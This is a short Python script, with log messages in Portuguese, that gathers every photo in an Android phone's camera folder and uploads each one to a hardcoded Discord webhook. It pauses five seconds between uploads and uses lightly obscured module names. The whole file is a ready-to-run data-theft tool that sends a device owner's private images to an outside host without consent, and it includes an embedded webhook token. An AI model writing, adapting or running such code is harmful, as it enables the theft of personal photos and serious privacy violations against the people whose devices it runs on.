import os as a1, requests as a2, time as a3

status=1
base="/storage/emulated/0/DCIM/Camera"
webhook="https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"
exts=(".jpg",".jpeg",".png",".heic")

def send_file(a4):
    try:
        with open(a4,"rb") as f:
            r=a2.post(webhook,files={"file":(a4.split("/")[-1],f)})
            if r.status_code in (200,204):
                print(f"[+] Enviado: {a4}")
                return True
            else:
                print(f"[!] Falhou ({r.status_code}): {a4}")
                return False
    except Exception as e:
        print(f"[!] Erro ao enviar {a4}: {e}")
        return False

def gather_photos():
    res=[]
    for r,d,f in a1.walk(base):
        for file in f:
            if file.lower().endswith(exts):
                res.append(a1.path.join(r,file))
    return res

def run():
    if status!=1:
        print("[*] Status diferente de 1, abortando envio.")
        return
    fotos=gather_photos()
    if not fotos:
        print("[!] Nenhuma foto encontrada.")
        return
    for foto in fotos:
        send_file(foto)
        a3.sleep(5)

if __name__=="__main__":
    run()
